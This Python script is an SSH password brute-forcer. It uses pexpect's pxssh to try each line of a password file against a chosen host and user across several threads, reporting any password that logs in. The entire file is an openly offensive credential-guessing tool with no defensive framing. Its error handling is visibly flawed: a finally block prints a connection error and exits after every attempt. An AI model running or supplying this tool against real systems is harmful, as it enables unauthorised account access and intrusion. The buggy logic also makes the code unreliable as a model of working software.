from pexpect import pxssh
import argparse
import time
from threading import *

maxConnnections =5
connection_lock = BoundedSemaphore(value=maxConnnections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()
        print('[-] Error Connecting')
        exit(0)

def main():
    p = argparse.ArgumentParser(description='SSH Password Brute FOrce')
    p.add_argument('-H', dest='tgtHost', type=str, help='specify target host')
    p.add_argument('-F', dest='passwdFile', type=str, help='Specify target file')
    p.add_argument('-u', dest='user', type=str, help='specify the user')

    args = p.parse_args()
    host = args.tgtHost
    passwdFile = args.passwdFile
    user= args.user
    
    if host is None or passwdFile is None or user is None:
        p.print_help()
        exit(0)
    with open(passwdFile, 'r') as fn:
       for line in fn.readlines():
          if Found:
             print("[*] Exiting: Password Found")
             exit(0)
          
          if Fails > 5:
             print("[!] Exiting: Too many socket timeouts")
             exit(0)

          connection_lock.acquire()
          password = line.strip('\r').strip('\n')
          print("[-] Testing: " + str(password))
          t = Thread(target=connect, args=(host, user, password, True))
          child = t.start()
if __name__ == '__main__':
    main()